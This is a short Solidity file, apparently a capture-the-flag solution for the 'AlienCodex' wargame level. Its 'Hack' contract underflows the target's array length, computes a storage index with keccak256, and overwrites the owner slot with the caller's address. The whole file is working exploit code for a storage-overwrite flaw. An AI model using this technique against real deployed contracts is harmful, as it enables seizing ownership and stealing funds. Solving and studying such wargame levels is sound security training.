
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

interface IAlienCodex {
    function makeContact() external;
    function record(bytes32 _content)  external;
    function retract()  external;
    function revise(uint i, bytes32 _content)  external;
}
contract Hack{
    IAlienCodex private Alien;
    constructor(address _address){
        Alien=IAlienCodex(_address);
    }
//0x2B104fbD2AE6a2f838CC4A32aecF6c3CdE257586
    function makeContract()external{
        Alien.makeContact();
        Alien.retract();
       uint256 num= uint256(keccak256(abi.encode(1)));
       uint256 i;
        unchecked {
            i -= num;
        }
        Alien.revise(i, bytes32(uint256(uint160(msg.sender))));
    }

}